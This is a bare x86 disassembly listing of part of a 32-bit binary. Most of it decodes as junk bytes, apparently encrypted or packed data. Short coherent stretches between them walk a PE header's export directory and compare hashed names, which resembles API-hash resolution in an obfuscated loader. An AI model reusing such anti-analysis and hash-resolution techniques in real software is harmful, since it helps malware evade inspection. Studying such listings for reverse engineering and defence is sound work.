  403008:	mov    ecx,0x28edd7d7
  40300d:	push   esp
  40300e:	and    al,0x62
  403010:	mov    eax,ds:0xf0b87f9e
  403015:	add    ch,BYTE PTR ds:[edi+0x3930b662]
  40301c:	imul   esp,edi,0xb23f50ef
  403022:	les    esi,FWORD PTR [edi-0x41491c14]
  403028:	pop    eax
  403029:	mov    eax,0xaf30c0e
  40302e:	out    0x53,al
  403030:	fisubr DWORD PTR ds:0x305493a8
  403036:	cwde   
  403037:	push   ebp
  403038:	add    ch,BYTE PTR [edi+0x455437ca]
  40303e:	xchg   edi,eax
  40303f:	sub    ebx,DWORD PTR [edx+0x11]
  403042:	into   
  403043:	test   bl,cl
  403045:	(bad)  
  403046:	sub    BYTE PTR [eax-0x7b],bh
  403049:	cmp    eax,0xde4df16d
  40304e:	pushf  
  40304f:	jae    0x403044
  403051:	mov    edi,0x43dcdcb2
  403056:	ds out dx,eax
  403058:	(bad)  
  403059:	aam    0xfb
  40305b:	jecxz  0x40302a
  40305d:	dec    ecx
  40305e:	mov    esp,0xcb1e51f7
  403063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403064:	ss loop 0x403003
  403067:	fdivp  st(6),st
  403069:	fwait
  40306a:	sbb    DWORD PTR [ebp-0x52],edi
  40306d:	mov    dl,0x8d
  40306f:	pop    esp
  403070:	push   cs
  403071:	jmp    0x85b5:0x236b4161
  403078:	pop    esi
  403079:	gs sbb eax,0x709eaa0f
  40307f:	inc    ecx
  403080:	mov    eax,DWORD PTR [ebp+0x8]
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	xchg   ebx,eax
  403098:	push   0x15924c79
  40309d:	js     0x403117
  40309f:	(bad)  
  4030a0:	jle    0x40311a
  4030a2:	js     0x403115
  4030a4:	xchg   ecx,eax
  4030a5:	dec    ecx
  4030a6:	mov    cl,0x38
  4030a8:	mov    ch,0x62
  4030aa:	mov    bl,0x5e
  4030ac:	in     al,0x41
  4030ae:	fwait
  4030af:	mov    edi,0xdfb5c45e
  4030b4:	fcmovu st,st(0)
  4030b6:	out    dx,al
  4030b7:	pop    edi
  4030b8:	push   ebx
  4030b9:	mov    eax,ds:0xf2f448fa
  4030be:	fsub   st,st(3)
  4030c0:	call   0x852f:0x287cbe4b
  4030c7:	retf   
  4030c8:	rol    DWORD PTR [edx*2+0x3df63433],1
  4030cf:	das    
  4030d0:	test   BYTE PTR [ebx+0x6a],al
  4030d3:	jb     0x40309b
  4030d5:	in     al,dx
  4030d6:	std    
  4030d7:	rol    BYTE PTR [eax-0x55],cl
  4030da:	sbb    DWORD PTR [edi],eax
  4030dc:	xor    ebp,ecx
  4030de:	in     al,0x68
  4030e0:	pop    ss
  4030e1:	jae    0x403148
  4030e3:	mov    al,ds:0x7e9e1da9
  4030e8:	pop    esi
  4030e9:	or     bh,BYTE PTR [edi]
  4030eb:	out    0x95,al
  4030ed:	in     al,dx
  4030ee:	and    DWORD PTR [esi-0x3f6fe414],edx
  4030f4:	sbb    al,0xda
  4030f6:	loopne 0x403101
  4030f8:	inc    esp
  4030f9:	jle    0x403178
  4030fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030fc:	mov    bl,0xf4
  4030fe:	sbb    al,0xe7
  403100:	ficom  DWORD PTR [edi-0x75]
  403103:	sub    ah,BYTE PTR [esp+edi*2-0x33]
  403107:	xchg   ecx,eax
  403108:	test   eax,0x6128467b
  40310d:	xchg   ebx,eax
  40310e:	pop    edx
  40310f:	fcom   QWORD PTR [ebp-0x7b]
  403112:	inc    ebx
  403113:	pop    ds
  403114:	xchg   edi,eax
  403115:	stos   DWORD PTR es:[edi],eax
  403116:	das    
  403117:	mov    ch,ch
  403119:	jp     0x4030ba
  40311b:	test   BYTE PTR [ebx-0x4c8ef505],cl
  403121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403122:	xchg   edi,eax
  403123:	pop    edx
  403124:	iret   
  403125:	lds    esp,FWORD PTR [ecx+0x52e7a723]
  40312b:	jo     0x4030e3
  40312d:	retf   0xf7f9
  403130:	scas   eax,DWORD PTR es:[edi]
  403131:	push   esp
  403132:	(bad)  
  403134:	std    
  403135:	cld    
  403136:	shr    BYTE PTR [eax],0xf4
  403139:	pop    edx
  40313a:	ja     0x4031a1
  40313c:	and    esp,DWORD PTR [ebp+0xf]
  40313f:	push   ds
  403140:	iret   
  403141:	inc    eax
  403142:	push   edx
  403143:	sbb    ebx,DWORD PTR [esi]
  403145:	std    
  403146:	(bad)  
  403147:	mov    dl,0x85
  403149:	sahf   
  40314a:	sbb    ebx,DWORD PTR [esi]
  40314c:	inc    ebx
  40314d:	pop    edx
  40314e:	pop    edi
  40314f:	adc    eax,0xadb4114a
  403154:	inc    edi
  403155:	mov    ds:0xcc23940,al
  40315a:	dec    edx
  40315b:	pushf  
  40315c:	sbb    ebp,esp
  40315e:	xchg   ebx,eax
  40315f:	adc    edi,0x65def659
  403165:	ja     0x40319b
  403167:	sar    DWORD PTR [ebx+0x1fab35a1],cl
  40316d:	cli    
  40316e:	cld    
  40316f:	stos   BYTE PTR es:[edi],al
  403170:	lds    ebp,FWORD PTR [esp+eiz*2-0x56a451e9]
  403177:	inc    dx
  403179:	in     al,0x19
  40317b:	cmp    DWORD PTR [eax+ebx*4-0x5f],edx
  40317f:	inc    ebx
  403180:	sbb    bh,BYTE PTR [ebx]
  403182:	mov    esi,0x401acddd
  403187:	out    0x86,al
  403189:	ja     0x403145
  40318b:	adc    eax,0x82565825
  403190:	jecxz  0x4031a0
  403192:	push   ss
  403193:	out    dx,al
  403194:	mov    eax,ds:0xba9451ad
  403199:	shl    DWORD PTR [esi+0x22],1
  40319c:	and    bh,BYTE PTR [eax-0x21]
  40319f:	inc    ecx
  4031a0:	or     BYTE PTR ds:0x1633db76,0xbc
  4031a8:	fucomp st(4)
  4031aa:	push   ebp
  4031ab:	push   edi
  4031ac:	enter  0xefb,0xb2
  4031b0:	mov    esp,DWORD PTR [edx+esi*2+0x9]
  4031b4:	mov    eax,ds:0x94b4618e
  4031b9:	or     BYTE PTR [ecx-0x1d],bl
  4031bc:	mov    BYTE PTR [edx-0x42],bh
  4031bf:	cmp    BYTE PTR [ecx+ebp*8+0x62],0xa
  4031c4:	or     al,0xf8
  4031c6:	scas   eax,DWORD PTR es:[edi]
  4031c7:	dec    edx
  4031c8:	dec    eax
  4031c9:	push   esi
  4031ca:	cmc    
  4031cb:	test   BYTE PTR [ebx-0x177eea65],dh
  4031d1:	cmp    eax,0x5759baa3
  4031d6:	mov    ?,edx
  4031d8:	and    dh,dh
  4031da:	int    0x91
  4031dc:	sub    ecx,DWORD PTR [edx-0x49242e1c]
  4031e2:	retf   
  4031e3:	jb     0x403254
  4031e5:	push   ecx
  4031e6:	adc    ch,BYTE PTR [eax-0xe2a0dd0]
  4031ec:	add    esi,DWORD PTR [ebp-0x50f66b55]
  4031f2:	xchg   edx,esi
  4031f4:	sbb    eax,0x49e8e78d
  4031f9:	jae    0x403216
  4031fb:	test   DWORD PTR [edx],0x7aac4c20
  403201:	dec    esp
  403202:	jl     0x403277
  403204:	or     al,al
  403206:	pop    edi
  403207:	stc    
  403208:	gs je  0x40320c
  40320b:	(bad)
  403210:	gs int 0xdc
  403213:	ja     0x403254
  403215:	pop    es
  403216:	(bad)  
  403217:	stc    
  403218:	ds or  bh,bl
  40321b:	outs   dx,DWORD PTR ds:[esi]
  40321c:	int3   
  40321d:	clc    
  40321e:	in     eax,dx
  40321f:	mov    ebp,DWORD PTR [ebx]
  403221:	pop    eax
  403222:	pop    edi
  403223:	mov    al,0x78
  403225:	mov    DWORD PTR [edx-0x3503f866],esp
  40322b:	js     0x40327c
  40322d:	push   esi
  40322e:	inc    esi
  40322f:	push   es
  403230:	fdiv   DWORD PTR [edi+0xf0f922f]
  403236:	dec    ebp
  403237:	enter  0xe86,0x70
  40323b:	sbb    bh,BYTE PTR [ebp-0x2553e4a7]
  403241:	test   al,0x15
  403243:	jnp    0x4031f4
  403245:	inc    ecx
  403246:	rcr    edx,cl
  403248:	push   eax
  403249:	jle    0x403209
  40324b:	jmp    edi
  40324d:	imul   eax,DWORD PTR [eax-0x80],0x14924dcf
  403254:	in     al,dx
  403255:	mov    eax,0x39de463f
  40325a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40325b:	pop    ds
  40325c:	xor    eax,0xee9772d1
  403261:	fucomip st,st(4)
  403263:	sbb    al,0x32
  403265:	int3   
  403266:	adc    ecx,DWORD PTR [eax]
  403268:	shr    DWORD PTR [ebx],0x5c
  40326b:	(bad)  [edi+0x23]
  40326e:	jp     0x403231
  403270:	call   DWORD PTR [ebx-0x4cad40a3]
  403276:	xor    edi,esp
  403278:	sbb    eax,0xf4c20dc0
  40327d:	imul   ebx,DWORD PTR [ebx-0x40],0x7
  403281:	jmp    0x4032e6
  403283:	fist   WORD PTR [esp+ebp*4]
  403286:	jbe    0x403235
  403288:	xchg   ebp,eax
  403289:	cwde   
  40328a:	pop    ecx
  40328b:	mov    esi,0x2004d9c2
  403290:	repz jne 0x40321e
  403293:	pop    ds
  403294:	ins    DWORD PTR es:[edi],dx
  403295:	lods   al,BYTE PTR ds:[esi]
  403296:	cdq    
  403297:	pop    esi
  403298:	sbb    ch,BYTE PTR [esi-0x56e496c]
  40329e:	cdq    
  40329f:	jle    0x403243
  4032a1:	dec    ebx
  4032a2:	ret    0xd6e3
  4032a5:	ret    
  4032a6:	out    dx,al
  4032a7:	cs popa 
  4032a9:	fisubr WORD PTR [esi+0x412ee199]
  4032af:	jge    0x40323a
  4032b1:	adc    DWORD PTR [eax+ebx*1+0x7f],0x72ab4f6f
  4032b9:	and    esi,ecx
  4032bb:	sub    esp,0x56e9b742
  4032c1:	inc    ebp
  4032c2:	(bad)  
  4032c3:	pop    es
  4032c4:	mov    bh,0xc
  4032c6:	ja     0x40332c
  4032c8:	push   ds
  4032c9:	aas    
  4032ca:	fscale 
  4032cc:	dec    DWORD PTR [eax+0x1749b6e5]
  4032d2:	mov    ecx,gs
  4032d4:	ins    BYTE PTR es:[edi],dx
  4032d5:	mov    ah,0x48
  4032d7:	fnstcw WORD PTR [ecx+0x32]
  4032da:	in     al,dx
  4032db:	lods   eax,DWORD PTR ds:[esi]
  4032dc:	(bad)  
  4032de:	pop    edx
  4032df:	sbb    DWORD PTR [ebp-0x2f9d0e86],ebx
  4032e5:	xor    al,bh
  4032e7:	(bad)  
  4032ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032eb:	call   0xa7b7:0xc7d25cd6
  4032f2:	les    edx,FWORD PTR [ecx-0x4fc8b441]
  4032f8:	fdiv   DWORD PTR [edi-0x7c]
  4032fb:	sub    BYTE PTR [ebx+ebp*1-0x44e1e552],dl
  403302:	and    DWORD PTR [ebx],0xf723c27e
  403308:	sbb    eax,DWORD PTR [eax]
  40330a:	das    
  40330b:	fs out 0x65,al
  40330e:	and    eax,DWORD PTR [esi+esi*8]
  403311:	xchg   ecx,eax
  403312:	cmp    BYTE PTR [esp+eax*4],bh
  403315:	jp     0x4032a8
  403317:	gs stos DWORD PTR es:[edi],eax
  403319:	and    eax,0x1e0a4133
  40331e:	or     DWORD PTR [edx+0x7b5e05b],0x3c633f1
  403328:	(bad)  
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0x353dc34a]
  403372:	popa   
  403373:	fbstp  TBYTE PTR [eax+0x10]
  403376:	sbb    bh,BYTE PTR [eax+0x78]
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x4033e8
  40337e:	inc    ebp
  40337f:	test   BYTE PTR [eax-0x13],0xc2
  403383:	dec    esp
  403384:	mov    esi,0x6fe77dd0
  403389:	and    BYTE PTR [ecx+0x4473ffdb],0xf4
  403390:	div    ecx
  403392:	xlat   BYTE PTR ds:[ebx]
  403393:	jnp    0x4033a7
  403395:	and    dl,bl
  403397:	jno    0x403360
  403399:	cmp    ebx,DWORD PTR [ebx-0x21b8b243]
  40339f:	cmp    al,0x8f
  4033a1:	ss icebp 
  4033a3:	sti    
  4033a4:	idiv   DWORD PTR [edi-0x46]
  4033a7:	pop    esi
  4033a8:	push   0xc26f23b0
  4033ad:	or     al,0x4e
  4033af:	add    eax,0xa14be65d
  4033b4:	or     eax,0x5cff2505
  4033b9:	add    DWORD PTR [ebx-0x58],edi
  4033bc:	rcr    BYTE PTR fs:[ecx+0x61],1
  4033c0:	dec    ecx
  4033c1:	stos   BYTE PTR es:[edi],al
  4033c2:	mov    WORD PTR [ebx],fs
  4033c4:	sahf   
  4033c5:	cmp    ah,BYTE PTR [ecx-0x6a4bfcb9]
  4033cb:	retf   0x6739
  4033ce:	or     bl,dl
  4033d0:	pop    eax
  4033d1:	jl     0x40344c
  4033d3:	push   esi
  4033d4:	std    
  4033d5:	out    dx,eax
  4033d6:	icebp  
  4033d7:	lea    eax,[ecx]
  4033d9:	pop    edi
  4033da:	mov    ah,0xac
  4033dc:	push   ebp
  4033dd:	push   ecx
  4033de:	mov    ebp,0xcfbdfa76
  4033e3:	xchg   edx,eax
  4033e4:	cmp    DWORD PTR [edi+0x74],eax
  4033e7:	push   ss
  4033e8:	xchg   edx,eax
  4033e9:	and    dh,BYTE PTR [ebx+0x41e6565b]
  4033ef:	inc    edx
  4033f0:	rol    DWORD PTR [edx],cl
  4033f2:	mov    ebp,0x58c2d2c7
  4033f7:	mov    ebx,0x92dc5440
  4033fc:	push   0x47ba24d7
  403401:	mov    edi,?
  403403:	mov    eax,0x462c1461
  403408:	outs   dx,BYTE PTR ds:[esi]
  403409:	push   edi
  40340a:	lods   eax,DWORD PTR ds:[esi]
  40340b:	xchg   esp,eax
  40340c:	or     DWORD PTR [ebx],0x79
  40340f:	sub    al,0xf4
  403411:	lock pushf 
  403413:	arpl   WORD PTR [esi-0x5c0cc224],di
  403419:	popf   
  40341a:	shl    DWORD PTR [ecx-0x4c],1
  40341d:	inc    esi
  40341e:	pop    ecx
  40341f:	mov    BYTE PTR [eax],al
  403421:	retf   0x6c73
  403424:	pop    edi
  403425:	sub    DWORD PTR [edi],0xffffff9e
  403428:	fwait
  403429:	pushf  
  40342a:	add    al,0x7b
  40342c:	push   eax
  40342d:	adc    BYTE PTR [edx+0x520b4e7e],cl
  403433:	es push eax
  403435:	push   ds
  403436:	(bad)  
  403438:	sahf   
  403439:	inc    edx
  40343a:	adc    eax,0x9af344b2
  40343f:	inc    edi
  403440:	jge    0x403438
  403442:	xlat   BYTE PTR ds:[ebx]
  403443:	mov    bh,0xeb
  403445:	and    edx,DWORD PTR [edx-0x68]
  403448:	cwde   
  403449:	sub    al,BYTE PTR ss:[edi]
  40344c:	jo     0x403474
  40344e:	add    ebp,DWORD PTR [edi-0x36]
  403451:	ss xchg ebp,eax
  403453:	jno    0x403418
  403455:	jp     0x403409
  403457:	test   al,0x5b
  403459:	jecxz  0x403424
  40345b:	xchg   esi,eax
  40345c:	inc    edi
  40345d:	mov    dh,0xc0
  40345f:	rol    DWORD PTR ds:0x961ae89d,cl
  403465:	mov    dh,0x78
  403467:	lods   eax,DWORD PTR ds:[esi]
  403468:	pop    ds
  403469:	loopne 0x4034ad
  40346b:	mov    ebx,ebx
  40346d:	clc    
  40346e:	mov    edx,0x5dbdb3e9
  403473:	rcr    DWORD PTR [edi],0x21
  403476:	pop    ecx
  403477:	mov    dl,0x68
  403479:	mov    ah,0x37
  40347b:	pushf  
  40347c:	push   edx
  40347d:	iret   
  40347e:	jg     0x4034af
  403480:	cmp    al,0xab
  403482:	clc    
  403483:	mov    dh,0x8c
  403485:	cld    
  403486:	call   0x9472c0e6
  40348b:	lahf   
  40348c:	data16 fdiv QWORD PTR gs:[eax]
  403490:	imul   ebx,eax,0xffffffd5
  403493:	add    BYTE PTR ds:0xcb15464d,cl
  403499:	pop    ebx
  40349a:	iret   
  40349b:	sub    eax,0x17001244
  4034a0:	pop    eax
  4034a1:	test   DWORD PTR [ebp+0x3e50d953],0x74e15e95
  4034ab:	test   BYTE PTR [edx+0x3],dh
  4034ae:	jo     0x40348e
  4034b0:	xchg   ecx,eax
  4034b1:	cld    
  4034b2:	lock sub bl,dl
  4034b5:	add    DWORD PTR [ebx+0x16879639],ecx
  4034bb:	call   DWORD PTR [edi+ecx*8+0x5ff662c0]
  4034c2:	test   eax,esi
  4034c4:	sub    DWORD PTR [eax+ecx*1],esp
  4034c7:	push   ebx
  4034c8:	data16 jl 0x403491
  4034cb:	aam    0xe5
  4034cd:	push   es
  4034ce:	xor    dl,BYTE PTR [edi+0x32]
  4034d1:	xor    eax,0x3142352c
  4034d6:	and    ebp,DWORD PTR [esi-0x256ab18a]
  4034dc:	lods   al,BYTE PTR ds:[esi]
  4034dd:	dec    ebp
  4034de:	sub    BYTE PTR [ebp-0x33],bh
  4034e1:	dec    ecx
  4034e2:	test   BYTE PTR [esi],ah
  4034e4:	cmp    dh,bh
  4034e6:	sub    ebx,esp
  4034e8:	push   esi
  4034e9:	push   edi
  4034ea:	or     al,0x9b
  4034ec:	clc    
  4034ed:	jmp    0x1759c915
  4034f2:	cmp    BYTE PTR [esi-0x1],cl
  4034f5:	pop    ecx
  4034f6:	push   ds
  4034f7:	jo     0x403500
  4034f9:	add    al,0xba
  4034fb:	jmp    0xa0d4:0x21b1256f
  403502:	push   eax
  403503:	mov    WORD PTR [eax+0x13],ss
  403506:	cdq    
  403507:	ds or  eax,0xda1bf3ae
  40350d:	nop
  40350e:	loope  0x40355e
  403510:	jle    0x40349a
  403512:	cmp    eax,0x9fb3608c
  403517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403518:	mov    esp,0x8a8a0f90
  40351d:	aaa    
  40351e:	xlat   BYTE PTR ds:[ebx]
  40351f:	loopne 0x403501
  403521:	push   cs
  403522:	dec    edi
  403523:	or     eax,0x9877e698
  403528:	fstp   st(3)
  40352a:	xor    esi,DWORD PTR [eax]
  40352c:	call   0x2ebd43e0
  403531:	popa   
  403532:	and    al,0x6b
  403534:	push   ebp
  403535:	pop    ss
  403536:	int    0xd5
  403538:	and    edx,DWORD PTR [ebx+0x1]
  40353b:	test   cl,dh
  40353d:	adc    ebx,DWORD PTR [edx]
  40353f:	mov    esp,0x2001268a
  403544:	mov    cl,0xd9
  403546:	xchg   ebp,eax
  403547:	or     eax,0x3f04e080
  40354c:	xchg   esp,eax
  40354d:	mov    eax,0x9785bc90
  403552:	(bad)  
  403553:	rcr    BYTE PTR [ebp-0x68],1
  403556:	dec    esi
  403557:	inc    ebx
  403558:	les    ecx,FWORD PTR [edi]
  40355a:	xor    eax,0x52e9bf73
  40355f:	jmp    0xf64ae494
  403564:	xchg   edx,esi
  403566:	(bad)  
  403567:	imul   edx,DWORD PTR [edi+0x2c],0x4e
  40356b:	popf   
  40356c:	pushf  
  40356d:	rcr    BYTE PTR [ecx+esi*2+0x30],0xe1
  403572:	fwait
  403573:	das    
  403574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403575:	repnz xor al,0x4f
  403578:	cmp    BYTE PTR [esi+0xc0d541],0x1b
  40357f:	and    ebx,ebx
  403581:	mov    al,0x6d
  403583:	sbb    eax,DWORD PTR [esi+0x6d]
  403586:	fwait
  403587:	or     ebp,DWORD PTR [ecx]
  403589:	jnp    0x40352b
  40358b:	xchg   ebp,eax
  40358c:	xor    DWORD PTR [ebx],0x4d
  40358f:	dec    esp
  403590:	cdq    
  403591:	nop
  403592:	lahf   
  403593:	pop    ds
  403594:	mov    al,0x3c
  403596:	stc    
  403597:	nop
  403598:	push   ebp
  403599:	mov    BYTE PTR [esi-0x3d],0x62
  40359d:	sbb    DWORD PTR [esi+eax*2+0x7f],ecx
  4035a1:	not    DWORD PTR [ebx+0x31]
  4035a4:	stos   DWORD PTR es:[edi],eax
  4035a5:	mov    bh,0x95
  4035a7:	inc    esi
  4035a8:	jmp    DWORD PTR [edx+0x445ab151]
  4035ae:	xchg   esi,eax
  4035af:	pop    eax
  4035b0:	cmp    ebx,ebp
  4035b2:	sahf   
  4035b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035b4:	pushf  
  4035b5:	test   dh,bl
  4035b7:	mov    dh,0xa4
  4035b9:	adc    DWORD PTR [esp+eax*8],edx
  4035bc:	mov    edx,0x62ed12f4
  4035c1:	sbb    eax,0x9e294296
  4035c6:	cmp    ah,bl
  4035c8:	loopne 0x403598
  4035ca:	pop    eax
  4035cb:	and    bh,BYTE PTR [eax*2+0x3f41ccb8]
  4035d2:	retf   
  4035d3:	pop    edx
  4035d4:	iret   
  4035d5:	fisttp DWORD PTR [ebx+0x17]
  4035d8:	mov    edx,0x6a651f33
  4035dd:	or     BYTE PTR [ecx-0x66d8ceb0],ah
  4035e3:	test   DWORD PTR [ecx+0x5607e031],0xb6b671d
  4035ed:	mov    edi,0x5adeaeca
  4035f2:	push   ecx
  4035f3:	pusha  
  4035f4:	and    edi,DWORD PTR [edi-0x10]
  4035f7:	pop    edi
  4035f8:	cmp    eax,0x4465603b
  4035fd:	ret    
  4035fe:	inc    edi
  4035ff:	xor    eax,esi
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x86393aa7,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x40366a
  40363f:	adc    BYTE PTR [edx-0x31f42d0c],bl
  403645:	adc    esp,DWORD PTR [edi]
  403647:	leave  
  403648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403649:	fs daa 
  40364b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40364c:	jmp    0x40362b
  40364e:	stc    
  40364f:	mov    bh,0xef
  403651:	jecxz  0x4035f1
  403653:	es push eax
  403655:	mov    dh,0x5d
  403657:	dec    eax
  403658:	icebp  
  403659:	jnp    0x4036a0
  40365b:	lock adc al,ah
  40365e:	aad    0x12
  403660:	jecxz  0x4036a6
  403662:	popf   
  403663:	call   0x97d89f65
  403668:	adc    al,0x87
  40366a:	dec    edi
  40366b:	imul   ebp,DWORD PTR [ebp+0x65],0x73
  40366f:	jae    0x40363f
  403671:	(bad)  
  403672:	cmp    eax,0x958c60d2
  403677:	push   ebp
  403678:	and    BYTE PTR ds:[eax],cl
  40367b:	icebp  
  40367c:	test   DWORD PTR [edi-0x4a],eax
  40367f:	and    eax,0xb70b6700
  403684:	call   0xc6e7d523
  403689:	lds    edi,FWORD PTR [edx-0x234d6024]
  40368f:	in     al,0x43
  403691:	or     BYTE PTR [ebx+0x5697a64d],al
  403697:	sti    
  403698:	mov    al,0x49
  40369a:	lds    edi,FWORD PTR [ebx+0x62]
  40369d:	push   ebx
  40369e:	ret    
  40369f:	or     BYTE PTR ss:[ebp-0x6],ah
  4036a3:	inc    ebp
  4036a4:	fwait
  4036a5:	jmp    0x245e:0xe8a4707a
  4036ac:	gs cmp esp,edi
  4036af:	sahf   
  4036b0:	lahf   
  4036b1:	lods   eax,DWORD PTR ds:[esi]
  4036b2:	push   eax
  4036b3:	lods   eax,DWORD PTR ds:[esi]
  4036b4:	popa   
  4036b5:	mov    esp,esp
  4036b7:	retf   
  4036b8:	push   cs
  4036b9:	in     eax,dx
  4036ba:	lds    ebp,FWORD PTR [ebp+ecx*8-0x40553b8e]
  4036c1:	mov    al,0x5c
  4036c3:	daa    
  4036c4:	fsubr  QWORD PTR [esi-0x7d]
  4036c7:	outs   dx,BYTE PTR ds:[esi]
  4036c8:	scas   al,BYTE PTR es:[edi]
  4036c9:	ins    DWORD PTR es:[edi],dx
  4036ca:	push   cs
  4036cb:	out    dx,al
  4036cc:	stos   BYTE PTR es:[edi],al
  4036cd:	jne    0x4036d7
  4036cf:	push   ss
  4036d0:	outs   dx,BYTE PTR ds:[esi]
  4036d1:	jb     0x4036fb
  4036d3:	aaa    
  4036d4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4036d6:	aad    0x65
  4036d8:	mov    dh,0x5e
  4036da:	cmp    eax,0x5c08d200
  4036df:	iret   
  4036e0:	add    edi,DWORD PTR [esi]
  4036e2:	cdq    
  4036e3:	iret   
  4036e4:	test   al,0xff
  4036e6:	shl    DWORD PTR [eax],cl
  4036e8:	xor    al,0x5f
  4036ea:	in     al,dx
  4036eb:	xchg   edi,eax
  4036ec:	aaa    
  4036ed:	jns    0x4036c1
  4036ef:	adc    DWORD PTR [di],ebx
  4036f2:	add    bl,BYTE PTR [eax]
  4036f4:	fadd   QWORD PTR [ebx-0x13a85d6]
  4036fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036fb:	js     0x4036aa
  4036fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036fe:	mov    edx,0x8aca412c
  403703:	push   0x61
  403705:	mov    al,ds:0x4941e68e
  40370a:	and    BYTE PTR [eax+ebx*8+0x36],cl
  40370e:	push   edx
  40370f:	pushf  
  403710:	jl     0x40376c
  403712:	xchg   esp,eax
  403713:	mov    ch,0x1a
  403715:	jle    0x4036aa
  403717:	call   0xe2b71154
  40371c:	fwait
  40371d:	lahf   
  40371e:	xchg   edi,eax
  40371f:	inc    edi
  403720:	iret   
  403721:	xor    DWORD PTR [eax+0x76],eax
  403724:	out    0x5c,eax
  403726:	lods   eax,DWORD PTR ds:[esi]
  403727:	fwait
  403728:	push   ss
  403729:	std    
  40372a:	push   ebx
  40372b:	mov    BYTE PTR [edi-0x47],ch
  40372e:	xor    al,0x39
  403730:	in     al,0x75
  403732:	mov    dl,0x33
  403734:	adc    eax,0x18842f3d
  403739:	sub    ch,BYTE PTR [esi]
  40373b:	and    BYTE PTR [ebx],dl
  40373d:	lods   al,BYTE PTR ds:[esi]
  40373e:	mov    edi,0xb67d500f
  403743:	mov    BYTE PTR [ecx-0x71],ch
  403746:	lds    eax,FWORD PTR [eax-0x80]
  403749:	xchg   edi,eax
  40374a:	aad    0xcb
  40374c:	popa   
  40374d:	rol    BYTE PTR [eax-0x1d],0xe4
  403751:	and    BYTE PTR [edi-0x2b],0xb7
  403755:	dec    ecx
  403756:	pop    esi
  403757:	fld    DWORD PTR [ecx+0x36]
  40375a:	mov    edi,0x349eefe4
  40375f:	jno    0x4037a0
  403761:	(bad)  
  403762:	xor    eax,0xef423a03
  403767:	inc    ebp
  403768:	mov    edx,0x25b32665
  40376d:	outs   dx,DWORD PTR ds:[esi]
  40376e:	cmp    eax,0x2a7366f0
  403773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403774:	xor    eax,0xceb5ee45
  403779:	inc    eax
  40377a:	ins    BYTE PTR es:[edi],dx
  40377b:	or     cl,BYTE PTR [ecx-0x72]
  40377e:	call   0x319:0x72e1e46f
  403785:	sbb    bl,dh
  403787:	adc    cl,BYTE PTR [ecx]
  403789:	mov    ebx,0xc49d43b1
  40378f:	xchg   esi,eax
  403790:	add    bl,ah
  403792:	test   eax,0x7d88879e
  403797:	cld    
  403798:	(bad)  
  403799:	cmp    ebp,esi
  40379b:	adc    DWORD PTR [ecx-0x2a991f33],ebx
  4037a1:	jmp    0x9796cb01
  4037a6:	arpl   WORD PTR [edi+0x23],di
  4037a9:	mov    ebx,0x6754774d
  4037ae:	sahf   
  4037af:	fisttp QWORD PTR [edx]
  4037b1:	adc    DWORD PTR ds:0xbb0bfec,0x7d0f138c
  4037bb:	sbb    DWORD PTR [esi],0xffffffb7
  4037be:	push   ebx
  4037bf:	pop    edi
  4037c0:	adc    BYTE PTR [ecx+0x5e],0x38
  4037c4:	and    BYTE PTR [ebx+eiz*8+0x4df71d1d],ah
  4037cb:	sub    eax,DWORD PTR [ecx-0x69]
  4037ce:	or     BYTE PTR [esi+0x2e],ch
  4037d1:	test   eax,0xc1d408da
  4037d6:	adc    al,0x95
  4037d8:	mov    dh,al
